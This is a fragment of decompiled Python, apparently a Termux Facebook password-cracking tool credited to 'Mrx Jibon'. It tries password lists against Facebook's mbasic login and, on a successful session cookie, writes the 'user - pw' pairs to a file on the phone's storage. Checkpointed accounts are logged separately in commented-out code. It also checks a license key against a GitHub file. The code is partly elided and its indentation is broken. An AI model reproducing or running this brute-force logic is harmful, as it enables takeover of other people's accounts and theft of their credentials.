# Decompile by : Bangladesh Hacker( Mrx Jibon)  
...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://chat.whatsapp.com/IruRGeLlCOx8dJCfd81R5q=' + tks)
        
    r1=requests.get("https://github.com/MRXJIBON/birganj/blob/main/birganj.txt").text
    if key1 in r1:
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		print('\n\033[1;92mJIBON OK : %s •  jjibonCP : %s'%(str(len(ok)),str(len(cp))));exit()
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Successful-ShaYU] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/Shayu_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				#	month = bulan_ttl[month].print('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahn(user)))
				#	wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahn(user))
					#cp.append(wrt)
					#open('/sdcard/AKING_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
			#	print('\r\033[1;91m[Checkpoint-SHAYU] %s | %s%s      ' % (user,pw,tahun(user)))
				#wrt = '%s - %s%s'%(user,pw,tahu(user))
				#cp.append(wrt)
			#	open('/sdcard/SHAYAN_CP.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
